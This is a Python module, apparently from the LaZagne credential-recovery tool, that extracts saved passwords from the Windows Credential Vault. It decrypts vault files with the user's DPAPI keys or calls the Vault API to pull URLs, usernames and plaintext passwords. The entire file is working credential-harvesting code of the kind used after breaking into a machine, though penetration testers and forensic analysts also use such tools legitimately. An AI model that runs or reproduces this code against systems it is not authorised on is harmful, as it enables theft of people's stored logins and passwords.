# -*- coding: utf-8 -*-
from lazagne.config.module_info import ModuleInfo
from lazagne.config.winstructure import *
from ctypes.wintypes import *
from lazagne.config.constant import constant


class Vault(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'vault', 'windows',  exec_at_end=True)

    def run(self):

        pwd_found = []
        if constant.user_dpapi.unlocked:
            main_vaut_directory = os.path.join(constant.profile['APPDATA'], u'..', u'Local', u'Microsoft', u'Vault')
            if os.path.exists(main_vaut_directory):
                for vault_directory in os.listdir(main_vaut_directory):
                    cred = constant.user_dpapi.decrypt_vault(os.path.join(main_vaut_directory, vault_directory))
                    if cred:
                        pwd_found.append(cred)
        
        # check if executed from current user (otherwise, Windows API cannot be called)
        elif constant.is_current_user:
            # retrieve passwords (IE, etc.) using the Windows Vault API
            if float(get_os_version()) <= 6.1:
                self.info(u'Vault not supported for this OS')
                return

            cbVaults = DWORD()
            vaults = LPGUID()
            hVault = HANDLE(INVALID_HANDLE_VALUE)
            cbItems = DWORD()
            items = c_char_p()
            pwd_found = []

            if vaultEnumerateVaults(0, byref(cbVaults), byref(vaults)) == 0:
                if cbVaults.value == 0:
                    self.debug(u'No Vaults found')
                    return
                else:
                    for i in range(cbVaults.value):
                        if vaultOpenVault(byref(vaults[i]), 0, byref(hVault)) == 0:
                            if hVault:
                                if vaultEnumerateItems(hVault, 0x200, byref(cbItems), byref(items)) == 0:

                                    for j in range(cbItems.value):

                                        items8 = cast(items, POINTER(VAULT_ITEM_WIN8))
                                        pItem8 = PVAULT_ITEM_WIN8()
                                        try:
                                            values = {
                                                'URL': str(items8[j].pResource.contents.data.string),
                                                'Login': str(items8[j].pUsername.contents.data.string)
                                            }
                                            if items8[j].pName:
                                                values['Name'] = items8[j].pName

                                            if vaultGetItem8(hVault, byref(items8[j].id), items8[j].pResource,
                                                             items8[j].pUsername, items8[j].unknown0, None, 0,
                                                             byref(pItem8)) == 0:

                                                password = pItem8.contents.pPassword.contents.data.string
                                                # Remove password too long
                                                if password and len(password) < 100:
                                                    values['Password'] = password

                                            pwd_found.append(values)

                                        except Exception as e:
                                            self.debug(e)

                                        if pItem8:
                                            vaultFree(pItem8)

                                    if items:
                                        vaultFree(items)

                                vaultCloseVault(byref(hVault))

                    vaultFree(vaults)

        return pwd_found
